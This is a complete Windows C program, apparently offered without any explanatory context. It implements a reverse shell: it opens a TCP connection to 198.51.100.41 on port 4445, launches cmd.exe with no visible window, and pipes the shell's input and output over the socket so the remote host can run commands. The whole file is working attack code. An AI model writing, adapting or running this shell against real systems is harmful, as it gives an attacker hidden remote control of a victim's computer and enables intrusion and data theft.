#include <winsock2.h>
#include <windows.h>

typedef struct {
    SOCKET sock;
    HANDLE pipe;
} RelayCtx;

DWORD WINAPI pipe_to_sock(LPVOID arg) {
    RelayCtx *c = (RelayCtx *)arg;
    char buf[4096];
    DWORD nr = 0;
    while (ReadFile(c->pipe, buf, sizeof(buf), &nr, NULL) && nr > 0) {
        if (send(c->sock, buf, (int)nr, 0) <= 0) break;
    }
    return 0;
}

DWORD WINAPI sock_to_pipe(LPVOID arg) {
    RelayCtx *c = (RelayCtx *)arg;
    char buf[4096];
    DWORD nw = 0;
    int nr;
    while ((nr = recv(c->sock, buf, sizeof(buf), 0)) > 0) {
        if (!WriteFile(c->pipe, buf, (DWORD)nr, &nw, NULL)) break;
    }
    return 0;
}

int main(void) {
    WSADATA w;
    WSAStartup(MAKEWORD(2, 2), &w);
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port = htons(4445);
    a.sin_addr.s_addr = inet_addr("198.51.100.41");
    if (connect(s, (struct sockaddr *)&a, sizeof(a)) != 0) return 1;

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE in_r, in_w, out_r, out_w;
    CreatePipe(&in_r, &in_w, &sa, 0);
    CreatePipe(&out_r, &out_w, &sa, 0);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = in_r;
    si.hStdOutput = out_w;
    si.hStdError = out_w;

    char cmd[] = "cmd.exe";
    CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(in_r);
    CloseHandle(out_w);

    RelayCtx c1 = { s, out_r }, c2 = { s, in_w };
    HANDLE t1 = CreateThread(NULL, 0, pipe_to_sock, &c1, 0, NULL);
    HANDLE t2 = CreateThread(NULL, 0, sock_to_pipe, &c2, 0, NULL);
    WaitForSingleObject(pi.hProcess, INFINITE);
    TerminateThread(t1, 0);
    TerminateThread(t2, 0);
    closesocket(s);
    return 0;
}
